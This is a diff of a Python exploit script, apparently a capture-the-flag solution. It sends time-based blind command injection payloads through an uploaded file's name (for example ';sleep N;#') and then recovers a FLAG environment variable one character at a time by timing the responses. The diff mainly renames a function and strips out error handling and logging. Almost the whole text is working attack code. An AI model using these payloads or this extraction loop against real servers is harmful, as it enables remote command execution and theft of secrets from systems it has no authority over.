@@ -20,60 +20,48 @@ session.get(URL.rsplit("/", 1)[0] + "/", timeout=15)
 
 #files = {"form_field_name": (filename, file_content, content_type)}
 
-def fire(payload, body=b"x"):
+def send(payload, body=b"x"):
     files = {"specimen": (payload, body, "text/plain")}
     t0 = time.time()
-    try:
-        r = session.post(URL, files=files, timeout=30, allow_redirects=False)
-    except requests.exceptions.RequestException as e:
-        print(f"request error: {e}")
-        return 99.0, None
+
+    r = session.post(URL, files=files)
+
     return time.time() - t0, r
 
 def hung(elapsed):
     return elapsed > THRESHOLD
 
 
-# Sanity
-elapsed, _ = fire(f";sleep {SLEEP};#")
-print(f"[*] sanity sleep: {elapsed:.2f}s {'HUNG' if hung(elapsed) else 'FAIL'}")
+# sanity check
+elapsed, _ = send(f";sleep {SLEEP};#")
 if not hung(elapsed):
     sys.exit("injection not firing")
 
 # $FLAG visible
-elapsed, _ = fire(f";[ ${{#FLAG}} -gt 0 ]&&sleep {SLEEP};#")
-print(f"[*] $FLAG visible: {elapsed:.2f}s {'HUNG' if hung(elapsed) else 'FAIL'}")
+elapsed, _ = send(f";[ ${{#FLAG}} -gt 0 ]&&sleep {SLEEP};#")
 if not hung(elapsed):
     sys.exit("$FLAG not visible")
 
 # Length
 flag_len = None
-print("[*] probing length...")
 for n in range(1, 128):
-    elapsed, _ = fire(f";[ ${{#FLAG}} -eq {n} ]&&sleep {SLEEP};#")
+    elapsed, _ = send(f";[ ${{#FLAG}} -eq {n} ]&&sleep {SLEEP};#")
     if hung(elapsed):
         flag_len = n
-        print(f"    length = {n}")
+        print(f"Flag length = {n}")
         break
 if flag_len is None:
     sys.exit("length not found")
 
 charset = string.ascii_letters + string.digits + "{}_-.!?@#%+=:,"
 flag = ""
-print(f"[*] extracting {flag_len} chars (POSIX style)...")
 for i in range(flag_len):
-    found = None
     for c in charset:
         payload = f";[ x$(echo $FLAG|cut -c{i+1}) = x{c} ]&&sleep {SLEEP};#"
-        elapsed, _ = fire(payload)
+        elapsed, _ = send(payload)
         if hung(elapsed):
-            found = c
             flag += c
-            print(f"    [cut {i+1:>2}/{flag_len}] {flag}")
+            print(f"Found {c}")
             break
-    if found is None:
-        print(f"[!] still no match. flag so far: {flag!r}")
-        print(f"    charset may be missing the char at position {i}")
-        break
 
 print(f"\n[+] FLAG: {flag}")
